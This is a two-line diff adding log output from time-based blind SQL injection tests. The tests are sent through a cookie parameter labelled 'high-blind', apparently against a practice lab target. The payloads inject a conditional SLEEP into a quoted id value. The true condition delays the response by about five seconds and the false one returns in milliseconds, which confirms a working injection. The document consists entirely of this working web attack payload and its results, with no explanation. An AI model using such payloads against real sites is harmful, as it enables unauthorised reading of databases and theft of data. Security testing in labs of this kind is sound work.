@@ -1,0 +1,2 @@
+5010 ms <<== high-blind cookie id=[1' AND IF(1=1,SLEEP(3),0) -- x]
+13 ms <<== high-blind cookie id=[1' AND IF(1=2,SLEEP(3),0) -- x]
